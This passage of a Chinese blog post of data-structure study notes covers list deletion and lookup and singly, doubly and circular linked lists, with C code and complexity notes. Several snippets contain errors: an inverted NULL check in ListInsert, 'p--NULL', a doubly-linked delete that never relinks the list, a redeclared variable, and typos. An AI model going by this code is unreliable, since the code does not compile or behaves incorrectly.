L.length--;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	<span class="type">int</span> L[maxsize]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="type">int</span> e=<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span>(deletelist(L,<span class="number">3</span>,e))</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除的第三个位置的值为%d\n&quot;</span>,e);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除操作的时间复杂度为O（n）</p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518161558034.png" alt="image-20220518161558034"></p>
<h4 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h4><p>GetElem(L,i):按位查找操作。获取表L中第i个位置的元素的值。</p>
<h5 id="静态分配"><a href="#静态分配" class="headerlink" title="静态分配"></a>静态分配</h5><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518161802282.png" alt="image-20220518161802282"></p>
<h5 id="动态分配"><a href="#动态分配" class="headerlink" title="动态分配"></a>动态分配</h5><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518162027212.png" alt="image-20220518162027212"></p>
<p>malloc申请空间返回的指针与前面设置的指针数据类型应该相同</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518162350193.png" alt="image-20220518162350193"></p>
<p>最好/最坏/平均时间复杂度：O(1)</p>
<h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518162644686.png" alt="image-20220518162644686"></p>
<h5 id="结构类型的比较"><a href="#结构类型的比较" class="headerlink" title="结构类型的比较"></a>结构类型的比较</h5><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518162852560.png" alt="image-20220518162852560"></p>
<p>正确处理方式</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people == b.people) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">pritf(<span class="string">&quot;false&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isCustomerEqual</span> <span class="params">(Customer a,Customer b)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people ==b.people)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>按值查找的时间复杂度</p>
<script type="math/tex; mode=display">
最好时间复杂度:O(1)
最坏时间复杂度:O(n)
平均时间复杂度:O(n)</script><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518210935623.png" alt="image-20220518210935623"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>                <span class="comment">//定义单链表节点类型</span></span><br><span class="line">    ElemType data;           <span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>      <span class="comment">//指针指向像一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LNode));                     <span class="comment">//增加一个新的节点：在内存中申请一个节点所需空间，并用指针p指向这个节点</span></span><br></pre></td></tr></table></figure>
<p>typedef 关键字 —— 数据类型重命名</p>
<p>typedef &lt;数据类型&gt;&lt;别名&gt;</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518211715052.png" alt="image-20220518211715052"></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518211913545.png" alt="image-20220518211913545"></p>
<p>LNode * ：表示return的时一个节点</p>
<p>LinkList L：强调是一个单链表L</p>
<h4 id="不带头节点的单链表"><a href="#不带头节点的单链表" class="headerlink" title="不带头节点的单链表"></a>不带头节点的单链表</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518212144006.png" alt="image-20220518212144006"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518212155476.png" alt="image-20220518212155476"></p>
<p>是否为空的判断是头节点是否为NULL</p>
<h4 id="带头结点的单链表"><a href="#带头结点的单链表" class="headerlink" title="带头结点的单链表"></a>带头结点的单链表</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220518212310388.png" alt="image-20220518212310388"></p>
<p>不带头节点的单链表在头指针后的data就开始存储数据，带头节点的单链表的第二个节点不存储数据，为NULL</p>
<h3 id="插入和删除"><a href="#插入和删除" class="headerlink" title="插入和删除"></a>插入和删除</h3><h4 id="按位序插入"><a href="#按位序插入" class="headerlink" title="按位序插入"></a>按位序插入</h4><p>带头结点</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519145908546.png" alt="image-20220519145908546"></p>
<p>if i = 6 : p指向NULL，则第i-1节点不存在，直接返回false</p>
<p>时间复杂度：O(n)</p>
<p>不带头节点</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519150604589.png" alt="image-20220519150604589"></p>
<p>不带头结点需要一段单独的代码来应对i=1的情况</p>
<h4 id="指定节点的后插操作"><a href="#指定节点的后插操作" class="headerlink" title="指定节点的后插操作"></a>指定节点的后插操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,* LinkList</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InserNextNode</span> <span class="params">(LNode *p ,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)               <span class="comment">//内存分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;data = e;              <span class="comment">//结点s保存数据元素e</span></span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	LNode *p;</span><br><span class="line">   	<span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">	p = L;</span><br><span class="line">	<span class="keyword">while</span> (p! = <span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> InsertNextNode(p,e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(1)</p>
<h4 id="前插操作"><a href="#前插操作" class="headerlink" title="前插操作"></a>前插操作</h4><p>两种方法：（1)传入头节点，依次遍历（2）采用后插方式，将节点p的值赋给新申请的节点，将插入的值赋给节点p</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">insertpriornode</span> <span class="params">(LNode *p, ElemTyoe e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;            <span class="comment">//新结点s连到p结点后</span></span><br><span class="line">    s-&gt;data=p-&gt;data;      <span class="comment">//将p中元素赋值给s</span></span><br><span class="line">    p-&gt;data=e;            <span class="comment">//p中元素覆盖为e</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519153009590.png" alt="image-20220519153009590"></p>
<p>时间复杂度：O(1)</p>
<h4 id="按位序删除"><a href="#按位序删除" class="headerlink" title="按位序删除"></a>按位序删除</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519154105544.png" alt="image-20220519154105544"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">listdelete</span><span class="params">(linklist &amp;L,<span class="type">int</span> i,elemtype &amp;e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *q=p-&gt;next;</span><br><span class="line">    e = q-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最好时间复杂度：O(1)</p>
<p>最坏/平均时间复杂度：O(n)</p>
<h4 id="指定节点的删除"><a href="#指定节点的删除" class="headerlink" title="指定节点的删除"></a>指定节点的删除</h4><p>下面例子为带头结点的单链表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">deletenode</span> <span class="params">(lnode *p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p--<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *q = p-&gt;next;</span><br><span class="line">    p-&gt;data = p-&gt;next-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(1)</p>
<p>如果p是最后一个节点，只能依次寻找p的前驱，时间复杂度为O(n)</p>
<h3 id="单链表的查找"><a href="#单链表的查找" class="headerlink" title="单链表的查找"></a>单链表的查找</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519162949205.png" alt="image-20220519162949205"></p>
<h4 id="按位查找-1"><a href="#按位查找-1" class="headerlink" title="按位查找"></a>按位查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LNode * <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">    	j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="按值查找-1"><a href="#按值查找-1" class="headerlink" title="按值查找"></a>按值查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LNode * <span class="title function_">LocateElem</span><span class="params">(LinkList L,ElemType e)</span>&#123;</span><br><span class="line">    LNode *p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>平均时间复杂度：O(n)</p>
<h4 id="求表长"><a href="#求表长" class="headerlink" title="求表长"></a>求表长</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Length</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">	<span class="type">int</span> len =<span class="number">0</span>;           <span class="comment">//统计表长</span></span><br><span class="line">	LNode *p = L;</span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		len++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(n)</p>
<h3 id="单链表的建立"><a href="#单链表的建立" class="headerlink" title="单链表的建立"></a>单链表的建立</h3><h4 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	ElemType data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//分配一个头结点L</span></span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>)                         <span class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;                     <span class="comment">//头结点之后暂时还没有结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L;  <span class="comment">//声明一个指向单链表的指针L</span></span><br><span class="line">    <span class="comment">//初始化一个空表</span></span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="comment">//······</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519170717022.png" alt="image-20220519170717022"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>&#123;</span><br><span class="line">    ListInsert(L,length+<span class="number">1</span>,e);</span><br><span class="line">    length++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
时间复杂度:O(n^2)</script><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//初始化空表</span></span><br><span class="line">    LNode *s,*r=L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;</span><br><span class="line">        s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//在r结点之后插入元素x</span></span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;                             <span class="comment">//永远保持r指向最后一个结点</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;                <span class="comment">//尾结点指针置空</span></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519172020891.png" alt="image-20220519172020891"></p>
<p>时间复杂度：O(n)</p>
<h4 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">		LNode *s;</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//创建头结点</span></span><br><span class="line">		L-&gt;next = <span class="literal">NULL</span>;                     <span class="comment">//初始化为空链表</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		<span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;                     <span class="comment">//输入9999表示结束</span></span><br><span class="line">			s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">			s-&gt;data=x;</span><br><span class="line">			s-&gt;next=L-&gt;next</span><br><span class="line">			L-&gt;next=s;                     <span class="comment">//将新结点插入表中，L为头指针</span></span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（ps：L-&gt;next = NULL是为了避免以前遗留的脏数据）</p>
<p>应用：链表的逆置 </p>
<h2 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h2><h3 id="初始化（带头结点）"><a href="#初始化（带头结点）" class="headerlink" title="初始化（带头结点）"></a>初始化（带头结点）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DlinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (DNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">    <span class="keyword">if</span>(L==null)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;prior = null;</span><br><span class="line">    L-&gt;next = null;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testDLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    DLinkList L;</span><br><span class="line">    InitDLinkList(L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519174125025.png" alt="image-20220519174125025"></p>
<h3 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h3><p>后插操作</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519174230546.png" alt="image-20220519174230546"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519174327671.png" alt="image-20220519174327671"></p>
<p>前插操作：通过双链表的特性可以找到插入位置的前一个结点，再对该结点进行后插操作</p>
<h3 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeketeNextDNode</span><span class="params">(DNode *p)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (p==null)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    DNode *q = p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(q==null)          <span class="comment">//p没有后继</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;next!=null)</span><br><span class="line">        q-&gt;next-&gt;prior=p;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="销毁双链表"><a href="#销毁双链表" class="headerlink" title="销毁双链表"></a>销毁双链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestoryList</span><span class="params">(DLinklist &amp;L)</span>&#123;</span><br><span class="line">    <span class="comment">//循环释放各个数据结点</span></span><br><span class="line">    <span class="keyword">while</span> (L-&gt;next != null)</span><br><span class="line">        DeleteNextDNode(L);</span><br><span class="line">    <span class="built_in">free</span>(L);   <span class="comment">//释放头结点</span></span><br><span class="line">    L=null;    <span class="comment">//头指针指向null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><h4 id="后向遍历"><a href="#后向遍历" class="headerlink" title="后向遍历"></a>后向遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p!=null)&#123;</span><br><span class="line">    <span class="comment">//对结点p做相应处理，eg按位查找按值查找打印等</span></span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="前向遍历"><a href="#前向遍历" class="headerlink" title="前向遍历"></a>前向遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p-&gt;prior != null)&#123;</span><br><span class="line">	p=p-&gt;prior;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度:O(n)</p>
<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p>分为：循环单链表，循环双链表</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519201322333.png" alt="image-20220519201322333"></p>
<h3 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h3><h4 id="定义循环单链表"><a href="#定义循环单链表" class="headerlink" title="定义循环单链表"></a>定义循环单链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>         <span class="comment">//定义单链表结点类型</span></span><br><span class="line">	ElemType data;            <span class="comment">//每个结点存放一个数据元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>       <span class="comment">//指针指向下一个结点</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个循环单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode * )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));   <span class="comment">//分配一个头结点</span></span><br><span class="line">    <span class="keyword">if</span>(L==null)                 <span class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next=L;                   <span class="comment">//头结点next指向头结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断循环单链表是否为空</span></span><br><span class="line"><span class="type">bool</span> Empty(LinkList L)&#123;</span><br><span class="line">	<span class="keyword">if</span>(L-&gt;next == 	L)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断结点p是否为循环单链表的表尾结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(LinkList L,LNide *p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next==L)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
